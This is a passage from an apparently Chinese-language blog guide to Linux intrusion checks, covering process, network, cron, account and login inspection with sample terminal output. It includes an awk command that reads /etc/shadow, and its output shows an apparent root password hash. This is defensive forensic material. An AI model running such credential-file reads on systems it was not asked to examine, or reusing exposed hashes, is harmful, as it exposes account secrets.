class="hljs-attribute">442637</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">7</span>  <span class="hljs-number">1</span>.<span class="hljs-number">5</span> /usr/local/aegis/aegis_client/aegis_11_83/AliYunDunMonitor<br> <span class="hljs-attribute">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">5</span> <span class="hljs-number">38</span>.<span class="hljs-number">8</span> /usr/sbin/mysqld<br>     <span class="hljs-attribute">92</span>       <span class="hljs-number">2</span>  <span class="hljs-number">0</span>.<span class="hljs-number">4</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span><span class="hljs-meta"> [kswapd0]</span><br> <span class="hljs-attribute">442626</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">4</span>  <span class="hljs-number">0</span>.<span class="hljs-number">7</span> /usr/local/aegis/aegis_client/aegis_11_83/AliYunDun<br></code></pre></td></tr></table></figure><h4 id="检查高内存进程"><a href="#检查高内存进程" class="headerlink" title="检查高内存进程"></a>检查高内存进程</h4><h5 id="top-c-o-MEM"><a href="#top-c-o-MEM" class="headerlink" title="top -c -o +%MEM"></a>top -c -o +%MEM</h5><p>以内存占比倒序</p><h5 id="ps-eo-pid-ppid-cpu-mem-cmd-–sort-mem-head-n-5"><a href="#ps-eo-pid-ppid-cpu-mem-cmd-–sort-mem-head-n-5" class="headerlink" title="ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%mem | head -n 5"></a>ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%mem | head -n 5</h5><p>ps查询进程，显示pid，ppid，cpu占比，内存占比，进程信息，以内存占比倒序，只显示top5</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps -eo pid,ppid,%cpu,%mem,cmd --sort=-%mem | head -n <span class="hljs-number">5</span><br>    <span class="hljs-attribute">PID</span>    PPID %CPU %MEM CMD<br> <span class="hljs-attribute">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">5</span> <span class="hljs-number">38</span>.<span class="hljs-number">8</span> /usr/sbin/mysqld<br> <span class="hljs-attribute">577393</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">2</span>.<span class="hljs-number">9</span> /sbin/multipathd -d -s<br>  <span class="hljs-attribute">82956</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">2</span>  <span class="hljs-number">2</span>.<span class="hljs-number">3</span> /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock<br> <span class="hljs-attribute">577430</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">2</span>  <span class="hljs-number">1</span>.<span class="hljs-number">5</span> /usr/bin/containerd<br></code></pre></td></tr></table></figure><h4 id="检查高流量进程"><a href="#检查高流量进程" class="headerlink" title="检查高流量进程"></a>检查高流量进程</h4><p>需要额外命令 nethogs，可能更改某些文件时间属性，影响通过文件时间判断</p><h5 id="centos命令安装"><a href="#centos命令安装" class="headerlink" title="centos命令安装"></a>centos命令安装</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> epel-release <br>yum -y <span class="hljs-keyword">install</span> nethogs<br></code></pre></td></tr></table></figure><h5 id="ubuntu命令安装"><a href="#ubuntu命令安装" class="headerlink" title="ubuntu命令安装"></a>ubuntu命令安装</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> nethogs<br></code></pre></td></tr></table></figure><h5 id="进程检查"><a href="#进程检查" class="headerlink" title="进程检查"></a>进程检查</h5><p>管理员权限执行 nethogs，默认会以实时流量进行降序刷新</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns">NetHogs version <span class="hljs-number">0.8.6-3</span><br><br>    PID USER     PROGRAM                                                                                            DEV         SENT      RECEIVED<br> <span class="hljs-number">676984</span> root     sshd: root@pts/<span class="hljs-number">0</span>                                                                                   eth0        <span class="hljs-number">0</span>.<span class="hljs-number">321</span>       <span class="hljs-number">0</span>.<span class="hljs-number">067</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">44765-89.248</span>.<span class="hljs-number">165.97:56284</span>                                                                        <span class="hljs-number">0</span>.<span class="hljs-number">011</span>       <span class="hljs-number">0</span>.<span class="hljs-number">023</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">8066-162.216</span>.<span class="hljs-number">149.193:50532</span>                                                                       <span class="hljs-number">0</span>.<span class="hljs-number">011</span>       <span class="hljs-number">0</span>.<span class="hljs-number">012</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">6000-205.210</span>.<span class="hljs-number">31.156:50132</span>                                                                        <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">3306-78.128</span>.<span class="hljs-number">114.102:50289</span>                                                                        <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">35487-31.6</span>.<span class="hljs-number">65.59:23619</span>                                                                           <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">55182-100.100</span>.<span class="hljs-number">154.78:80</span>                                                                          <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br> <span class="hljs-number">671886</span> root     /usr/local/aegis/aegis_client/aegis_11_91/AliYunDun                                                eth0        <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     unknown TCP                                                                                                    <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br><br></code></pre></td></tr></table></figure><h4 id="确认进程id-pid"><a href="#确认进程id-pid" class="headerlink" title="确认进程id(pid)"></a>确认进程id(pid)</h4><h5 id="pidof-精确匹配-已知进程全名"><a href="#pidof-精确匹配-已知进程全名" class="headerlink" title="pidof-精确匹配-已知进程全名"></a>pidof-精确匹配-已知进程全名</h5><p>pidof “process name”</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span>:~<span class="hljs-meta"># pidof <span class="hljs-string">&quot;/usr/sbin/mysqld&quot;</span></span><br><span class="hljs-number">659535</span><br>root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span>:~<span class="hljs-meta"># pidof <span class="hljs-string">&quot;mysqld&quot;</span></span><br><span class="hljs-number">659535</span><br></code></pre></td></tr></table></figure><h5 id="ps-pgrep-模糊匹配-已知进程部分名称"><a href="#ps-pgrep-模糊匹配-已知进程部分名称" class="headerlink" title="ps&#x2F;pgrep-模糊匹配-已知进程部分名称"></a>ps&#x2F;pgrep-模糊匹配-已知进程部分名称</h5><p>ps -ef | grep “process name” | grep -v grep | awk ‘{print $2}’</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">root@iZbp1191gh7vw52537lyxrZ:~# <span class="hljs-keyword">ps</span> -ef | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;my&quot;</span> | <span class="hljs-keyword">grep</span> -v <span class="hljs-keyword">grep</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span><br><span class="hljs-number">659535</span><br></code></pre></td></tr></table></figure><p>pgreap -f “process name”</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span>:~<span class="hljs-meta"># pgrep -f <span class="hljs-string">&quot;my&quot;</span></span><br><span class="hljs-number">659535</span><br></code></pre></td></tr></table></figure><h5 id="排查进程详细内容"><a href="#排查进程详细内容" class="headerlink" title="排查进程详细内容"></a>排查进程详细内容</h5><h6 id="lsof-p-pid"><a href="#lsof-p-pid" class="headerlink" title="lsof -p pid"></a>lsof -p pid</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# lsof -p <span class="hljs-number">659535</span><br><span class="hljs-attribute">COMMAND</span>    PID  USER   FD      TYPE             DEVICE SIZE/<span class="hljs-literal">OFF</span>      NODE NAME<br><span class="hljs-attribute">mysqld</span>  <span class="hljs-number">659535</span> mysql  cwd       DIR              <span class="hljs-number">252</span>,<span class="hljs-number">3</span>     <span class="hljs-number">4096</span>    <span class="hljs-number">138978</span> /var/lib/mysql<br><span class="hljs-attribute">mysqld</span>  <span class="hljs-number">659535</span> mysql  rtd       DIR              <span class="hljs-number">252</span>,<span class="hljs-number">3</span>     <span class="hljs-number">4096</span>         <span class="hljs-number">2</span> /<br><span class="hljs-attribute">81920</span>    <span class="hljs-number">267788</span> /var/lib/mysql/#innodb_temp/temp_10.ibt<br><span class="hljs-attribute">mysqld</span>  <span class="hljs-number">659535</span> mysql   <span class="hljs-number">37</span>w      REG              <span class="hljs-number">252</span>,<span class="hljs-number">3</span>      <span class="hljs-number">157</span>    <span class="hljs-number">138921</span> /var/lib/mysql/binlog.<span class="hljs-number">000244</span><br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~#<br></code></pre></td></tr></table></figure><h4 id="检查进程启动目录"><a href="#检查进程启动目录" class="headerlink" title="检查进程启动目录"></a>检查进程启动目录</h4><p>需要注意不一定是恶意文件目录</p><h5 id="pwdx-pid"><a href="#pwdx-pid" class="headerlink" title="pwdx pid"></a>pwdx pid</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># pwdx 659535</span><br><span class="hljs-number">659535</span>: <span class="hljs-regexp">/var/lib</span><span class="hljs-regexp">/mysql</span><br></code></pre></td></tr></table></figure><h4 id="检查进程实际启动文件"><a href="#检查进程实际启动文件" class="headerlink" title="检查进程实际启动文件"></a>检查进程实际启动文件</h4><p>查看到对应进程可执行文件的绝对路径</p><h5 id="ls-lat-proc-pid-exe"><a href="#ls-lat-proc-pid-exe" class="headerlink" title="ls -lat &#x2F;proc&#x2F;pid&#x2F;exe"></a>ls -lat &#x2F;proc&#x2F;pid&#x2F;exe</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ls -lat /proc/<span class="hljs-number">659535</span>/exe<br><span class="hljs-attribute">lrwxrwxrwx</span> <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">0</span> Mar <span class="hljs-number">11</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span> /proc/<span class="hljs-number">659535</span>/exe -&gt; /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><h4 id="检查进程关联文件"><a href="#检查进程关联文件" class="headerlink" title="检查进程关联文件"></a>检查进程关联文件</h4><h5 id="cat-proc-pid-maps"><a href="#cat-proc-pid-maps" class="headerlink" title="cat &#x2F;proc&#x2F;pid&#x2F;maps"></a>cat &#x2F;proc&#x2F;pid&#x2F;maps</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# cat /proc/<span class="hljs-number">659535</span>/maps<br><span class="hljs-attribute">55f8c0537000</span>-<span class="hljs-number">55</span>f8c0df4000 r--p <span class="hljs-number">00000000</span> fc:<span class="hljs-number">03</span> <span class="hljs-number">797247</span>                     /usr/sbin/mysqld<br><span class="hljs-attribute">55f8c0df4000</span>-<span class="hljs-number">55</span>f8c2549000 r-xp <span class="hljs-number">008</span>bd000 fc:<span class="hljs-number">03</span> <span class="hljs-number">797247</span>                     /usr/sbin/mysqld<br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~#<br></code></pre></td></tr></table></figure><h4 id="检查进程启动的所有线程"><a href="#检查进程启动的所有线程" class="headerlink" title="检查进程启动的所有线程"></a>检查进程启动的所有线程</h4><h5 id="ps-H-T-p-pid"><a href="#ps-H-T-p-pid" class="headerlink" title="ps H -T -p pid"></a>ps H -T -p pid</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps H -T -p <span class="hljs-number">659535</span><br>    <span class="hljs-attribute">PID</span>    SPID TTY      STAT   TIME COMMAND<br> <span class="hljs-attribute">659535</span>  <span class="hljs-number">659535</span> ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/mysqld<br> <span class="hljs-attribute">659535</span>  <span class="hljs-number">659538</span> ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">17</span> /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><p>SPID：线程ID </p><p>COMMAND：线程名称</p><h5 id="ps-Lf-pid"><a href="#ps-Lf-pid" class="headerlink" title="ps -Lf pid"></a>ps -Lf pid</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps -Lf <span class="hljs-number">659535</span><br><span class="hljs-attribute">UID</span>          PID    PPID     LWP  C NLWP STIME TTY      STAT   TIME CMD<br><span class="hljs-attribute">mysql</span>     <span class="hljs-number">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">659535</span>  <span class="hljs-number">0</span>   <span class="hljs-number">39</span> Mar07 ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/mysqld<br><span class="hljs-attribute">mysql</span>     <span class="hljs-number">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">659538</span>  <span class="hljs-number">0</span>   <span class="hljs-number">39</span> Mar07 ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">17</span> /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><h3 id="排查异常网络连接"><a href="#排查异常网络连接" class="headerlink" title="排查异常网络连接"></a>排查异常网络连接</h3><h4 id="netstat-anlp-grep-ESTABLISHED"><a href="#netstat-anlp-grep-ESTABLISHED" class="headerlink" title="netstat -anlp | grep ESTABLISHED"></a>netstat -anlp | grep ESTABLISHED</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# netstat -anlp | grep ESTABLISHED<br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">172.16.24.136:51856</span>     <span class="hljs-number">100.100.30.28:80</span>        ESTABLISHED <span class="hljs-number">442626</span>/AliYunDun<br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>     <span class="hljs-number">80</span> <span class="hljs-number">172.16.24.136:22</span>        <span class="hljs-number">218.30.113.52:1642</span>      ESTABLISHED <span class="hljs-number">671506</span>/sshd: root@p<br></code></pre></td></tr></table></figure><h4 id="netstat-anlp-grep-LISTEN"><a href="#netstat-anlp-grep-LISTEN" class="headerlink" title="netstat -anlp | grep LISTEN"></a>netstat -anlp | grep LISTEN</h4><p>检查设备监听情况，排查是否存在高危端口、是否存在监听0.0.0.0</p><h3 id="排查异常定时任务"><a href="#排查异常定时任务" class="headerlink" title="排查异常定时任务"></a>排查异常定时任务</h3><h4 id="检查系统定时任务-etc-crontab"><a href="#检查系统定时任务-etc-crontab" class="headerlink" title="检查系统定时任务&#x2F;etc&#x2F;crontab"></a>检查系统定时任务&#x2F;etc&#x2F;crontab</h4><h5 id="cat-etc-crontab"><a href="#cat-etc-crontab" class="headerlink" title="cat &#x2F;etc&#x2F;crontab"></a>cat &#x2F;etc&#x2F;crontab</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># cat /etc/crontab</span><br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br><span class="hljs-comment"># You can also override PATH, but by default, newer versions inherit it from the environment</span><br><span class="hljs-comment">#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br>17 ** * *root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6* * *root<span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6* * 7root<span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 61 * *root<span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br></code></pre></td></tr></table></figure><h4 id="检查各用户定时任务-var-spool-cron"><a href="#检查各用户定时任务-var-spool-cron" class="headerlink" title="检查各用户定时任务 &#x2F;var&#x2F;spool&#x2F;cron"></a>检查各用户定时任务 &#x2F;var&#x2F;spool&#x2F;cron</h4><h5 id="cat-var-spool-cron-username"><a href="#cat-var-spool-cron-username" class="headerlink" title="cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;username"></a>cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;username</h5><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@aliyun-xx_xx_xx_xx cron]<span class="hljs-comment"># ls -lat /var/spool/cron/</span><br>总用量 12<br>drwx------. <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>3月 <span class="hljs-number"> 12 </span>17:20 .<br>-rw-------  <span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 19 </span>3月 <span class="hljs-number"> 12 </span>17:20 root<br>drwxr-xr-x.<span class="hljs-number"> 11 </span>root root<span class="hljs-number"> 4096 </span>8月 <span class="hljs-number"> 18 </span>2023 ..<br><br><br>(base) [root@aliyun-xx_xx_xx_xx cron]<span class="hljs-comment"># cat /var/spool/cron/root</span><br>* * * * * echo 111<br>您在 /var/spool/mail/root 中有新邮件<br></code></pre></td></tr></table></figure><h5 id="检查当前用户定时任务-crontab-l"><a href="#检查当前用户定时任务-crontab-l" class="headerlink" title="检查当前用户定时任务 crontab -l"></a>检查当前用户定时任务 crontab -l</h5><p>读取&#x2F;var&#x2F;spool&#x2F;cron目录下对应用户的记录</p><h5 id="检查对于用户的定时任务-crontab-u-name-l"><a href="#检查对于用户的定时任务-crontab-u-name-l" class="headerlink" title="检查对于用户的定时任务 crontab -u name -l"></a>检查对于用户的定时任务 crontab -u name -l</h5><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@aliyun</span>-x cron]<span class="hljs-meta"># crontab -u root -l</span><br>* * * * * echo <span class="hljs-number">111</span><br></code></pre></td></tr></table></figure><h4 id="需要关注的定时任务目录及文件"><a href="#需要关注的定时任务目录及文件" class="headerlink" title="需要关注的定时任务目录及文件"></a>需要关注的定时任务目录及文件</h4><h5 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>crontab<br><span class="hljs-regexp">/etc/</span>cron.hourly<br><span class="hljs-regexp">/etc/</span>cron.daily<br><span class="hljs-regexp">/etc/</span>cron.weekly<br><span class="hljs-regexp">/etc/</span>cron.monthly<br><span class="hljs-regexp">/etc/</span>anacrontab<br></code></pre></td></tr></table></figure><h5 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h5><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-regexp">/etc/cron.d/</span><span class="hljs-string">\*</span><br><span class="hljs-regexp">/var/spool/cron/</span><span class="hljs-string">\*</span><br></code></pre></td></tr></table></figure><h3 id="排查异常用户"><a href="#排查异常用户" class="headerlink" title="排查异常用户"></a>排查异常用户</h3><h4 id="检查特权账号"><a href="#检查特权账号" class="headerlink" title="检查特权账号"></a>检查特权账号</h4><h5 id="awk-F-‘-3-0-print-1-’-etc-passwd"><a href="#awk-F-‘-3-0-print-1-’-etc-passwd" class="headerlink" title="awk -F: ‘$3&#x3D;&#x3D;0 {print $1}’ &#x2F;etc&#x2F;passwd"></a>awk -F: ‘$3&#x3D;&#x3D;0 {print $1}’ &#x2F;etc&#x2F;passwd</h5><p>默认情况下，只有root用户是特权用户</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dart">root<span class="hljs-meta">@iZbp</span>1191gh7vw52537lyxrZ:/# awk -F: <span class="hljs-string">&#x27;<span class="hljs-subst">$3</span>==0 &#123;print <span class="hljs-subst">$1</span>&#125;&#x27;</span> /etc/passwd<br>root<br></code></pre></td></tr></table></figure><p>读取&#x2F;etc&#x2F;passwd文件 以 : 分割字符，当第三个字符为0时，输出第一个字符</p><h4 id="检查可登录账号"><a href="#检查可登录账号" class="headerlink" title="检查可登录账号"></a>检查可登录账号</h4><p>查看存在密码账户，也就是可能会登录的账户</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">awk <span class="hljs-string">&#x27;/\<span class="hljs-variable">$1</span>|\<span class="hljs-variable">$5</span>|\<span class="hljs-variable">$6</span>/ &#123;print <span class="hljs-variable">$1</span>&#125;&#x27;</span> /etc/shadow<br></code></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift">root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span>:<span class="hljs-regexp">/# awk &#x27;/</span>\<span class="hljs-variable">$1</span><span class="hljs-operator">|</span>\<span class="hljs-variable">$5</span><span class="hljs-operator">|</span>\<span class="hljs-variable">$6</span><span class="hljs-operator">/</span> &#123;print <span class="hljs-variable">$1</span>&#125;&#x27; <span class="hljs-regexp">/etc/</span>shadow<br>root:<span class="hljs-variable">$6</span><span class="hljs-variable">$OFsjgtZl</span><span class="hljs-variable">$ng76xjs7xQZH0asW6h1RGwXSSD6nD5sIJF163Etabm8ydItXJiD0T8KRBPwmcUdG</span><span class="hljs-operator">/</span><span class="hljs-type">WDlckAtnlQOmaYVnDPis</span>.:<span class="hljs-number">19548</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><br></code></pre></td></tr></table></figure><p>读取 &#x2F;etc&#x2F;shadow 文件，匹配包含 $1 $5 $6 任意一个的字符串</p><h3 id="排查异常登录"><a href="#排查异常登录" class="headerlink" title="排查异常登录"></a>排查异常登录</h3><p>检查&#x2F;var&#x2F;run&#x2F;utmp，&#x2F;var&#x2F;log&#x2F;wtmp 中的记录</p><h4 id="who"><a href="#who" class="headerlink" title="who"></a>who</h4><p>查看当前登录用户信息用户名、登录方式（tty：本地登录、pst：远程登录）、登录时间、登录IP</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# who<br>root     tty1         2022<span class="hljs-string">-06</span><span class="hljs-string">-26</span> 09:35<br>root     pts/0        2022<span class="hljs-string">-08</span><span class="hljs-string">-24</span> 22:39 (125.33.205.114)<br></code></pre></td></tr></table></figure><p>默认数据来源</p><p>&#x2F;var&#x2F;run&#x2F;utmp 二进制文件 权限 -rw-rw-r–  root utmp</p><p>&#x2F;var&#x2F;log&#x2F;wtmp 二进制文件 权限 -rw-rw-r–  root utmp</p><h4 id="w"><a href="#w" class="headerlink" title="w"></a>w</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># w</span><br> <span class="hljs-number">22</span>:<span class="hljs-number">53</span>:<span class="hljs-number">35</span> up <span class="hljs-number">59</span> days, <span class="hljs-number">13</span>:<span class="hljs-number">20</span>,  <span class="hljs-number">2</span> users,  load average: <span class="hljs-number">0.00</span>, <span class="hljs-number">0.01</span>, <span class="hljs-number">0.05</span><br><span class="hljs-keyword">USER</span>     <span class="hljs-title">TTY</span>      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>root     tty1                      <span class="hljs-number">266</span>月<span class="hljs-number">22</span>  <span class="hljs-number">1</span>:<span class="hljs-number">35</span>   <span class="hljs-number">0.10s</span>  <span class="hljs-number">0.10s</span> -bash<br>root     pts/<span class="hljs-number">0</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>   <span class="hljs-number">22</span>:<span class="hljs-number">39</span>    <span class="hljs-number">7.00s</span>  <span class="hljs-number">0.02s</span>  <span class="hljs-number">0.00s</span> w<br></code></pre></td></tr></table></figure><p>默认数据来源</p><p>&#x2F;var&#x2F;run&#x2F;utmp 二进制文件 权限 -rw-rw-r–  root utmp</p><p>&#x2F;proc</p><h4 id="last"><a href="#last" class="headerlink" title="last"></a>last</h4><p>输出历史登录成功用户</p><h4 id="lastb"><a href="#lastb" class="headerlink" 